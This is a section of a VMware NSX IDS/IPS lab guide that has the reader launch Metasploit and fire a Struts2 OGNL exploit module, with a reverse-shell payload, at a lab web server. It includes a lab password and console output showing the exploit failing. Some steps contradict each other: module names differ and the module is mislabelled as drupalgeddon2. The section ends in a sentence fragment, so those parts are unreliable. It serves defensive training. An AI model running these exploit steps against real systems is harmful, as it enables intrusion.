
## 8. Advanced Attack and Configuration
**Estimated Time to Complete: 60 minutes**

In this **optional** exercise, we will explore some more advanced options in the NSX Distributed IDS/IPS Configuration
 * Tuning IDS/IPS Profile to turn off irrelevant signatures
 * Attempt to evade IDS/IPS detection by using obfuscations
 * Enable IDS/IPS event logging directly from each host to a syslog collector/SIEM

**Tuning IDS/IPS Profile to turn off irrelevant signatures**

> **Note**: Within an IDS/IPS Profile, you can define exclusions in order to turn off particular signatures within the context of that profile. Reasons to exclude signatures include false positives, noisy or irrelevant signatures being triggered.

1.	From the console session with  **External VM**, type **sudo msfconsole** to launch **Metasploit**. Enter **VMware1!** if prompted for a password. Follow the below steps to initiate the exploit. Hit **enter** between every step. 
    * Type **use exploit/multi/http/struts2_namespace_ognl** to select the drupalgeddon2 exploit module
    * Type **set RHOST 192.168.10.101** to define the IP address of the victim to attack. The IP address should match the IP address of **App1-WEB-TIER VM**
    * Type **exploit -z** to initiate the exploit, esbalish a reverse shell, and background the session.

> **Note**: This exploit will fail as  **App1-WEB-TIER VM** is not running an Apache Struts service vulnerable to this exploit.
    
```console
msf5 >  use exploit/multi/http/struts2_content_type_ognl
[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp
msf5 exploit(multi/http/struts2_content_type_ognl) > set RHOST 192.168.10.101
RHOST => 192.168.10.101
msf5 exploit(multi/http/struts2_content_type_ognl) > set RHOST 192.168.10.101
RHOST => 192.168.10.101
msf5 exploit(multi/http/struts2_content_type_ognl) > exploit

[*] Started reverse TCP handler on 10.114.209.151:4444
[-] Exploit aborted due to failure: bad-config: Server returned HTTP 404, please double check TARGETURI
[*] Exploit completed, but no session was created.
msf5 exploit(multi/http/struts2_content_type_ognl) >

```
    
establish a **reverse shell** from the Drupal server, and use it as a **pivot** to gain access to the internal network which is not direclty accessible from the external VM. Traffic to the internal network will be routed through the established **reverse shell** from the **App1-WEB-TIER VM**. 

---

[***Next Step: 9. Segmentation***](/docs/9-Segmentation.md)
